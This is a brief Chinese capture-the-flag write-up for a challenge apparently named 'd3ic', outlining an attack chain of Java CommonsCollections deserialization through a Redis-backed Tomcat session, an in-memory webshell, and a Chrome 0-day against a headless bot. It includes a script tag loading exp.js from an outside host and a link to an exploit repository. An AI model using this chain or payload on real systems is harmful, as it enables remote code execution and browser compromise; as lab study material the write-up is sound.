---
tags: [Java反序列化, CommonsCollections, Redis利用, Session反序列化, Chrome 0-day, XSS]
---

# d3ic

先在vps上设置好cc6 payload ，然后透过go服务在redis缓存payload ，然后设置JSESSION ，值为url算出的crc ，访问demo/index.jsp ，tomcat.request.session.redisSessionManager#findSession会触发反序列化

 

打个内存马上去改/demo/index.jsp ，bot是HeadlessChrome/89.0.4389.0

```
<script src="http://xx/js/exp.js"></script>
```

https://github.com/77409/chrome-0day